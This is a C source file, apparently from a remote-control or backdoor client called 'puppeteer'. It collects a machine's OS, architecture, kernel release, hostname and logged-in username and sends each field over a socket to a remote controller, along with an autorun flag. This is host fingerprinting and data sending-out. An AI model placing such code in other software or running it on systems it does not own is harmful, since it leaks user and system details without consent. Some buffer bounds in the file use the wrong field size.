// MIT License
/*
 * This header file belongs to https://github.com/arthur-bryan/puppeteer
 *
 * Gets some PC information like architecture, hostname and username
 * and send it over socket
 *
 * Copyright (c) 2021 Arthur Bryan <arthurbryan2030@gmail.com>
 */
#include "../include/information.h"

#include <unistd.h>
#ifdef __unix__
#include <sys/utsname.h>
#include <pwd.h>
#else
#include "../include/utsname_windows.h"
#include <windows.h>
#endif
#include <string.h>
#include <stdio.h>

#include "../include/sockets.h"
#include "../include/footprint.h"


/*
 * Fills the pointers to char with its respective data about the PC
 * information.
 *
 * Parameters:
 *      char *op_system:    to store the operating system
 *      char *architecture: to store the system architecture
 *      char *hostname:     to store the PC hostname
 *      char *username:     to store the logged-in username
 */
host_t
get_host_info(void) {
    #ifdef __unix__
    struct passwd       *user;
    struct utsname      host_info;
    #else
    #endif
    host_t              host;

    #ifdef __unix__
    user = getpwuid(getuid());
    snprintf(host.username, sizeof host.op_system, "%s", user->pw_name);
    #else
    struct w_utsname    host_info;
    char                username[20];
    uint32_t            username_size;

    username_size = sizeof username;
    if (GetUserNameA(username, (unsigned long *)&username_size)) {
        snprintf(host.username, sizeof host.op_system, "%s", username);
    }
    #endif
    uname(&host_info);
    snprintf(host.op_system, sizeof host.op_system, "%s", host_info.sysname);
    snprintf(host.architecture, sizeof host.op_system, "%s", host_info.machine);
    snprintf(host.release, sizeof host.op_system, "%s", host_info.release);
    gethostname(host.hostname, sizeof host.hostname);
    host.autorun_enabled = 0;
    return host;
}

/*
 * Sends the PC information over the socket after filling the host structure
 * First send the length of the string to be sent, and then sends the string
 * itself. This process repeats for each host structure member to ensure that
 * the bytes will be sent correctly.
 *
 * Parameters:
 *      int16_t socket_fd:  the socket file descriptor
 */
void
send_host_info(int16_t socket_fd, host_t host) {
    uint32_t    op_system_len;
    uint32_t    arch_len;
    uint32_t    kernel_len;
    uint32_t    hostname_len;
    uint32_t    username_len;

    host.op_system[sizeof host.op_system-1] = '\0';
    host.architecture[sizeof host.architecture-1] = '\0';
    host.release[sizeof host.release-1] = '\0';
    host.hostname[sizeof host.hostname-1] = '\0';
    host.username[sizeof host.username-1] = '\0';

    op_system_len = strlen(host.op_system) + 1;
    arch_len = strlen(host.architecture) + 1;
    kernel_len = strlen(host.release) + 1;
    hostname_len = strlen(host.hostname) + 1;
    username_len = strlen(host.username) + 1;

    #ifdef __unix__
    send(socket_fd, &op_system_len, sizeof op_system_len, 0);
    send(socket_fd, host.op_system, op_system_len, 0);

    send(socket_fd, &arch_len, sizeof arch_len, 0);
    send(socket_fd, host.architecture, arch_len, 0);

    send(socket_fd, &kernel_len, sizeof kernel_len, 0);
    send(socket_fd, host.release, kernel_len, 0);

    send(socket_fd, &hostname_len, sizeof hostname_len, 0);
    send(socket_fd, host.hostname, hostname_len, 0);

    send(socket_fd, &username_len, sizeof username_len, 0);
    send(socket_fd, host.username, username_len, 0);

    send(socket_fd, &host.autorun_enabled, sizeof host.autorun_enabled, 0);
    #else
    send(socket_fd, (char *)&op_system_len, sizeof op_system_len, 0);
    send(socket_fd, host.op_system, op_system_len, 0);

    send(socket_fd, (char *)&arch_len, sizeof arch_len, 0);
    send(socket_fd, host.architecture, arch_len, 0);

    send(socket_fd, (char *)&kernel_len, sizeof kernel_len, 0);
    send(socket_fd, host.release, kernel_len, 0);

    send(socket_fd, (char *)&hostname_len, sizeof hostname_len, 0);
    send(socket_fd, host.hostname, hostname_len, 0);

    send(socket_fd, (char *)&username_len, sizeof username_len, 0);
    send(socket_fd, host.username, username_len, 0);

    send(socket_fd, (char *)&host.autorun_enabled, sizeof host.autorun_enabled,
                                                   0);
    #endif
}
